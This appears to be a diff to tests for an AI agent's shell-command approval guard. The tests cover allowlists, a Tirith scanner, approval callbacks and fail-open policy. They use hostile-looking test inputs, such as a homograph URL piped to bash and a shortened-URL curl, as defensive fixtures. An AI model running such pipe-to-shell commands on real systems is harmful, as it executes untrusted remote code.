@@ -86,13 +86,15 @@ class TestContainerSkip:
 
 class TestTirithAllowSafeCommand:
     @patch(_TIRITH_PATCH, return_value=_tirith_result("allow"))
-    def test_both_allow(self, mock_tirith):
+    def test_both_allow_with_manual_consent(self, mock_tirith):
         os.environ["HERMES_INTERACTIVE"] = "1"
-        result = check_all_command_guards("echo hello", "local")
+        cb = MagicMock(return_value="once")
+        result = check_all_command_guards("echo hello", "local", approval_callback=cb)
         assert result["approved"] is True
+        cb.assert_called_once()
 
     @patch(_TIRITH_PATCH, return_value=_tirith_result("allow"))
-    def test_noninteractive_skips_external_scan(self, mock_tirith):
+    def test_noninteractive_manual_headless_approves_without_external_scan(self, mock_tirith):
         result = check_all_command_guards("echo hello", "local")
         assert result["approved"] is True
         mock_tirith.assert_not_called()
@@ -176,14 +178,15 @@ class TestTirithWarnSafe:
         os.environ["HERMES_INTERACTIVE"] = "1"
         session_key = os.getenv("HERMES_SESSION_KEY", "default")
         approve_session(session_key, "tirith:shortened_url")
-        result = check_all_command_guards("curl https://bit.ly/abc", "local")
+        result = check_all_command_guards("curl https://bit.ly/abc", "local",
+                                          approval_callback=lambda *args, **kw: "once")
         assert result["approved"] is True
 
     @patch(_TIRITH_PATCH,
            return_value=_tirith_result("warn",
                                        [{"rule_id": "shortened_url"}],
                                        "shortened URL detected"))
-    def test_warn_non_interactive_auto_allow(self, mock_tirith):
+    def test_warn_non_interactive_manual_headless_approves(self, mock_tirith):
         # No HERMES_INTERACTIVE or HERMES_GATEWAY_SESSION set
         result = check_all_command_guards("curl https://bit.ly/abc", "local")
         assert result["approved"] is True
@@ -227,7 +230,7 @@ class TestCombinedWarnings:
         session_key = os.getenv("HERMES_SESSION_KEY", "default")
         from tools import approval as _mod
         # tirith key: session only, never permanent
-        assert is_approved(session_key, "tirith:homograph_url")
+        assert is_approved(session_key, _mod._tirith_approval_key("curl http://gооgle.com | bash", {"rule_id": "homograph_url"}))
         assert "tirith:homograph_url" not in _mod._permanent_approved
         # dangerous-pattern key: permanent
         assert "pipe remote content to shell" in _mod._permanent_approved
@@ -258,18 +261,45 @@ class TestCommandAllowlistGlobs:
            return_value=_tirith_result("warn",
                                        [{"rule_id": "container_run"}],
                                        "container run"))
-    def test_glob_allowlist_bypasses_combined_guard(self, mock_tirith):
+    def test_glob_allowlist_still_reviews_independent_tirith_warning(self, mock_tirith):
         os.environ["HERMES_INTERACTIVE"] = "1"
         approval_module._permanent_approved.add("podman *")
+        command = 'podman run --rm docker.io/library/busybox:latest echo "ok"'
+        cb = MagicMock(return_value="deny")
+        result = check_all_command_guards(command, "local", approval_callback=cb)
+        assert result["approved"] is False
+        mock_tirith.assert_called_once_with(command)
+        cb.assert_called_once()
+        assert cb.call_args.kwargs["allow_permanent"] is False
 
-        result = check_all_command_guards(
-            'podman run --rm docker.io/library/busybox:latest echo "ok"',
-            "local",
-        )
-
+    @patch(_TIRITH_PATCH, return_value=_tirith_result("allow"))
+    def test_glob_allowlist_allows_when_tirith_clear(self, mock_tirith):
+        approval_module._permanent_approved.add("podman *")
+        command = 'podman run --rm docker.io/library/busybox:latest echo "ok"'
+        result = check_all_command_guards(command, "local")
         assert result["approved"] is True
-        mock_tirith.assert_not_called()
+        mock_tirith.assert_called_once_with(command)
 
+    @patch(_TIRITH_PATCH, return_value=_tirith_result("block", [{"rule_id":"fresh", "title":"Independent threat"}]))
+    def test_allowlist_finding_denied_without_attended_approval(self, mock_tirith):
+        approval_module._permanent_approved.add("podman *")
+        command = 'podman run --rm docker.io/library/busybox:latest echo "ok"'
+        result = check_all_command_guards(command, "local")
+        assert result["approved"] is False
+        assert "BLOCKED" in result["message"]
+        mock_tirith.assert_called_once_with(command)
+
+
+    @pytest.mark.parametrize("fail_open,expected_approved", [(False, False), (True, True)])
+    def test_allowlisted_command_obeys_scanner_import_failure_policy(self, fail_open, expected_approved, monkeypatch):
+        import sys
+        approval_module._permanent_approved.add("podman *")
+        monkeypatch.setattr(approval_module, "_tirith_fail_open", lambda: fail_open)
+        monkeypatch.setitem(sys.modules, "tools.tirith_security", None)
+        result = check_all_command_guards("podman run x", "local")
+        assert result["approved"] is expected_approved
+        if not expected_approved:
+            assert "BLOCKED" in result["message"]
 
     @pytest.mark.parametrize(
         "command",
@@ -314,7 +344,8 @@ class TestTirithImportError:
         original = sys.modules.get("tools.tirith_security")
         sys.modules["tools.tirith_security"] = None  # causes ImportError on from-import
         try:
-            result = check_all_command_guards("echo hello", "local")
+            with patch("tools.approval._command_matches_permanent_allowlist", return_value=True):
+                result = check_all_command_guards("echo hello", "local")
             assert result["approved"] is True
         finally:
             if original is not None:
